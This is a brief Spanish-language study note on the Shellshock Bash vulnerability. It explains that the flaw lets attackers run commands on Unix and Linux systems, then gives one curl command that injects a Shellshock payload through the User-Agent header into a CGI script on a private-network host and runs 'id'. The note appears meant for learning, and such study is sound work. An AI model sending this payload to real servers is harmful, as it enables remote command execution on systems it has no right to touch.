___
- tags: #owasp #shell_shock
___
Es un ataque informático que aprovecha una vulnerabilidad en el **intérprete de comandos en Bash** en sistemas operativos basados en Unix y Linux.

Esta vulnerabilidad en Bash permite a los atacantes ejecutar comandos maliciosos en el sistema afectado, lo que les permite tomar el control del sistema y acceder a información confidencial, modificar archivos, instalar programas maliciosos, etc.

```shell
curl -s -X GET "http://192.168.1.104/cgi-bin/test.sh" -H "User-Agent: () { :; }; echo; /usr/bin/id"
```